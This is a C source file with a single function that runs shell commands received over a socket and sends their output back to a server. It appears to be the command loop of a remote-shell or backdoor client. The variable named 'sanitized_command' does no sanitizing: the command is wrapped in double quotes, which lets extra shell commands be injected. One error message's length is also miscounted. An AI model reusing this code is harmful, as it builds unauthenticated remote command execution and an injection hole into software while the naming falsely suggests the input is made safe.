#include "command_handler.h"
#define BUFFER_SIZE 1024
#define RESPONSE_END_MARKER "[END_OF_RESPONSE]"

// Function to execute a command and send the output to the server
void execute_and_send_command(int sockfd, const char *command, const char *shell) {
    if (!command || strlen(command) == 0) {
        send(sockfd, "ERROR: Empty command\n", 21, 0);
        return;
    }

    char sanitized_command[BUFFER_SIZE];
    snprintf(sanitized_command, BUFFER_SIZE, "%s -c \"%s\" 2>&1", shell, command);

    FILE *command_output = popen(sanitized_command, "r");
    if (!command_output) {
        perror("Error executing command");
        send(sockfd, "ERROR: Command execution failed\n", 31, 0);
        return;
    }

    char response[BUFFER_SIZE];
    while (fgets(response, sizeof(response), command_output)) {
        if (send(sockfd, response, strlen(response), 0) < 0) {
            perror("Error sending response");
            pclose(command_output);
            return;
        }
    }

    pclose(command_output);

    // Send the end-of-response marker
    if (send(sockfd, RESPONSE_END_MARKER, strlen(RESPONSE_END_MARKER), 0) < 0) {
        perror("Error sending end-of-response marker");
    }
}